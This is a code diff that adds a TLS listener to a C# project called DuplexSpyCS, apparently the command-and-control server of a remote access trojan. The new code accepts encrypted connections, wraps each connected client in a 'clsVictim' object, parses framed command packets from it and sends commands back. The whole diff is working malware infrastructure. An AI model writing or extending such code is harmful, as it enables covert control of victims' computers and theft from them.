@@ -1,6 +1,10 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Linq;
+using System.Net;
+using System.Net.Security;
+using System.Net.Sockets;
+using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Threading.Tasks;
 
@@ -8,29 +12,170 @@ namespace DuplexSpyCS
 {
     public class clsTlsListener : clsListener
     {
-        public clsTlsListener(string szName, int nPort, string szDescription)
+        private X509Certificate m_certificate { get; set; }
+        private TcpListener m_listener { get; set; }
+
+        public clsTlsListener(string szName, int nPort, string szDescription, string szCertPath, string szCertPassword)
         {
             m_szName = szName;
             m_nPort = nPort;
             m_szDescription = szDescription;
-
             m_protocol = enListenerProtocol.TLS;
+
+            m_certificate = new X509Certificate(szCertPath, szCertPassword);
+            m_listener = new TcpListener(IPAddress.Any, nPort);
+
+            m_bIslistening = false;
         }
 
         ~clsTlsListener() => fnStop();
 
         public override void fnStart()
         {
-            //base.fnStart();
+            if (m_bIslistening)
+            {
+                MessageBox.Show($"Listener[{m_szName} is already in used.", "fnStart()", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
+                return;
+            }
 
+            Socket sktSrv = m_listener.Server;
+            var hSafe = sktSrv.SafeHandle;
+            if (sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
+            {
+                m_listener = null;
+                m_listener = new TcpListener(IPAddress.Any, m_nPort);
+            }
+
+            m_listener.Start();
+            m_listener.BeginAcceptTcpClient(new AsyncCallback(fnAcceptCallback), m_listener);
             m_bIslistening = true;
         }
 
         public override void fnStop()
         {
             //base.fnStop();
-
+            m_listener.Stop();
             m_bIslistening = false;
+        }
+
+        private byte[] fnCombineBytes(byte[] first_bytes, int first_idx, int first_len, byte[] second_bytes, int second_idx, int second_len)
+        {
+            byte[] bytes = null;
+            using (MemoryStream ms = new MemoryStream())
+            {
+                ms.Write(first_bytes, first_idx, first_len);
+                ms.Write(second_bytes, second_idx, second_len);
+                bytes = ms.ToArray();
+            }
+
+            return bytes;
+        }
+
+        private void fnAcceptCallback(IAsyncResult ar)
+        {
+            if (ar == null || ar.AsyncState == null)
+                return;
+
+            TcpListener listener = (TcpListener)ar.AsyncState;
+            Socket sktSrv = listener.Server;
+
+            try
+            {
+                var hSafe = sktSrv.SafeHandle;
+                if (!m_bIslistening || sktSrv == null || hSafe == null || hSafe.IsInvalid || hSafe.IsClosed)
+                    return;
+
+                listener.BeginAcceptTcpClient(new AsyncCallback(fnAcceptCallback), listener);
+
+                TcpClient clnt = m_listener.EndAcceptTcpClient(ar);
+                SslStream sslStream = new SslStream(clnt.GetStream(), false);
+                sslStream.AuthenticateAsServer(m_certificate, false, false);
+
+                clsVictim vicitm = new clsVictim(clnt.Client, sslStream, this);
+
+                sslStream.BeginRead(vicitm.buffer, 0, vicitm.buffer.Length, new AsyncCallback(fnReadCallback), vicitm);
+            }
+            catch (Exception ex)
+            {
+
+            }
+        }
+
+        private void fnReadCallback(IAsyncResult ar)
+        {
+            if (ar == null || ar.AsyncState == null)
+                return;
+
+            clsVictim victim = (clsVictim)ar.AsyncState;
+
+            try
+            {
+                SslStream sslClnt = victim.m_sslClnt;
+                clsDSP dsp = null;
+
+                clsStore.sql_conn.WriteSystemLogs($"New client is accepted: {victim.socket.RemoteEndPoint.ToString()}");
+
+                int nRecv = 0;
+                byte[] abStaticRecvBuffer = new byte[clsVictim.MAX_BUFFER_LENGTH];
+                byte[] abDynamicRecvBuffer = { };
+
+                clsStore.sql_conn.WriteSystemLogs($"Sent handshake: {victim.socket.RemoteEndPoint.ToString()}");
+
+                do
+                {
+                    abStaticRecvBuffer = new byte[clsVictim.MAX_BUFFER_LENGTH];
+                    nRecv = sslClnt.Read(abStaticRecvBuffer, 0, abStaticRecvBuffer.Length);
+                    abDynamicRecvBuffer = fnCombineBytes(abDynamicRecvBuffer, 0, abDynamicRecvBuffer.Length, abStaticRecvBuffer, 0, nRecv);
+
+                    clsStore.recv_bytes += nRecv;
+
+                    if (nRecv <= 0)
+                        break;
+                    else if (abDynamicRecvBuffer.Length < clsDSP.HEADER_SIZE)
+                        continue;
+                    else
+                    {
+                        var header = clsDSP.GetHeader(abDynamicRecvBuffer);
+                        while (abDynamicRecvBuffer.Length - clsDSP.HEADER_SIZE >= header.len)
+                        {
+                            dsp = new clsDSP(abDynamicRecvBuffer);
+                            abDynamicRecvBuffer = dsp.MoreData;
+                            header = clsDSP.GetHeader(abDynamicRecvBuffer);
+
+                            byte[] abBuffer = dsp.GetMsg().msg;
+
+                            int nCmd = header.cmd;
+                            int nParam = header.para;
+
+                            if (nCmd == 0)
+                            {
+                                if (nParam == 0)
+                                {
+                                    string szPlain = Encoding.UTF8.GetString(abBuffer);
+                                    List<string> lsMsg = szPlain.Split('|').ToList();
+
+                                    try
+                                    {
+                                        fnReceivedDecoded(this, victim, lsMsg);
+                                        victim.fnSendCommand("x");
+                                    }
+                                    catch (InvalidOperationException)
+                                    {
+
+                                    }
+                                }
+                            }
+                        }
+                    }
+                }
+                while (nRecv > 0);
+            }
+            catch (Exception ex)
+            {
+                //MessageBox.Show(ex.Message);
+                clsStore.sql_conn.WriteErrorLogs(victim, ex.Message);
+                fnDisconnected(victim);
+            }
         }
     }
 }
